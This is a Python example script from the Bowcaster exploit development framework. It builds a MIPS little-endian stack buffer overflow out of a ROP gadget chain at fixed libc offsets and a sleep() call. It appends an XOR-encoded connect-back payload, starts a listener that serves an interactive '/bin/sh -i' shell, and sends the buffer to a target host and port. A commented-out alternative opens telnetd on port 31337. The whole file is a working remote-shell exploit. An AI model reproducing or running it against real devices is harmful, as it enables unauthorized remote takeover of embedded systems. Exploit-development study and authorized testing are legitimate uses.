#!/usr/bin/env python
# Copyright (c) 2013
# - Zachary Cutlip <uid000@gmail.com>
# - Tactical Network Solutions, LLC
# 
# See LICENSE.txt for more details.
# 


#This is an exmaple using Crossbow's EmptyOverflowBuffer class to build a buffer
#overflow

import os
import struct
import sys
import socket
import signal
import time
from bowcaster.common.support import Logging
from bowcaster.development.overflowbuilder import EmptyOverflowBuffer
from bowcaster.common.support import LittleEndian
from bowcaster.servers.connectback_server import ConnectbackServer
from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
from bowcaster.encoders.mips import MipsXorEncoder

CALLBACK_IP="192.168.127.10"
CALLBACK_PORT="8080"

logger=Logging()

qemu=False

libc_qemu_base=0x4084a000
libc_actual_base=0x2aaee000
libc_base=0

if qemu:
    libc_base=libc_qemu_base
else:
    libc_base=libc_actual_base

badchars=['\0',0x0d,'\n',0x20]

buf=EmptyOverflowBuffer(LittleEndian,default_base=libc_base,badchars=badchars,maxlength=2048)


#first function epilogue
ra=528

#second function epilogue
s0=620
s2=628
s6=644
ra_2=656

#stack offsets
sleep_return=688
shellcode_return=700

buf.add_pattern(ra) #$ra loaded from offset 528

#function_epilogue_rop
buf.add_rop_gadget(0x31b44,
            description="[$ra] function epilogue that sets up $s1-$s7")

buf.add_pattern(s0-buf.len())
#address of sleep
buf.add_rop_gadget(0x506c0,
            description="[$s0] Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")

buf.add_pattern(s2-buf.len())
#placeholder address that can be dereferenced without crashing, this goes in $s2
buf.add_rop_gadget(0x427a4,
            description="[$s2] placeholder, derefed without crashing.")

buf.add_pattern(s6-buf.len())
#stackjumber. jalr $s0
buf.add_rop_gadget(0x1ffbc,description="[$s6] stackjumper")

buf.add_pattern(ra_2-buf.len())
#Sleep arg 2 into $a0, stack data into $ra, then jalr $s0
buf.add_rop_gadget(0x43880,
            description="[$a0] Set up 2 sec arg to sleep(), then jalr $s1")

buf.add_pattern(sleep_return-buf.len())
#stackfinder. add 0xe0+var_c0 + $sp into $s0, jalr $s6
buf.add_rop_gadget(0x427a4,description="stackfinder.")

payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
encoded_payload=MipsXorEncoder(payload,badchars=badchars)

buf.add_pattern(shellcode_return-buf.len())
buf.add_string(encoded_payload.shellcode,
            description="encoded connect back payload")


if len(sys.argv) == 2:
    search_string=sys.argv[1]
    if search_string.startswith("0x"):
        search_value=int(search_string,16)
    else:
        search_value=search_string
    offset=buf.find_offset(search_value)
    if(offset < 0):
        print "Couldn't find string %s in the overflow buffer." % search_string
    else:
        print "Found string %s at\noffset: %d" % (search_string,offset)
    exit(0)

addr=sys.argv[1]
port=int(sys.argv[2])


connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
#Or non-interactive exploitation:
#connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
pid=connectback_server.serve()
time.sleep(1)
if pid:
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((addr,port))
        logger.LOG_INFO("sending exploit.")
        sock.send(str(buf))
        sock.close()
        connectback_server.wait()
    except Exception as e:
        logger.LOG_WARN("Failed to connect. ")
        logger.LOG_WARN("Failed to connect. Killing connect-back server.")
        connectback_server.shutdown()
else:
    logger.LOG_WARN("Failed to start connect-back server.")
    sys.exit(1)

